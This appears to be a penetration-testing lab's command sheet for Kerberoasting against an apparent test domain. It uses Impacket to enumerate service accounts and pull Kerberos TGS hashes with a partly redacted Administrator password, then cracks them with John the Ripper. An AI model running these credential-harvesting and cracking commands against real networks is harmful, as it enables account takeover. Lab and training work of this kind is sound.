# 💻 Phase 7 Commands — Kerberoasting & Service Account Extraction

## Enumerate Service Principal Names (SPNs)

```bash
impacket-GetUserSPNs solaris.local/Administrator:'(3vRP<REDACTED>' -dc-ip 192.168.10.7
```

### Purpose

Enumerates Active Directory service accounts configured with Service Principal Names (SPNs).

This identifies accounts potentially vulnerable to Kerberoasting attacks.

---

## Request Kerberos Service Ticket & Extract TGS Hash

```bash
impacket-GetUserSPNs solaris.local/Administrator:'(3vRP<REDACTED>' -dc-ip 192.168.10.7 -request
```

### Purpose

Requests Kerberos TGS tickets for identified service accounts and extracts crackable Kerberos service ticket hashes.

---

## Save Extracted TGS Hash

```bash
nano kerberoast_hashes.txt
```

### Purpose

Stores extracted Kerberos TGS hashes locally for offline password cracking.

---

## Crack Kerberos Hash Using John the Ripper

```bash
john kerberoast_hashes.txt --wordlist=custom.txt --format=krb5tgs
```

### Purpose

Performs offline cracking against the extracted Kerberos TGS hash using a custom password wordlist.

---

## Display Cracked Credentials

```bash
john --show kerberoast_hashes.txt
```

### Purpose

Displays recovered service account credentials after successful password cracking.
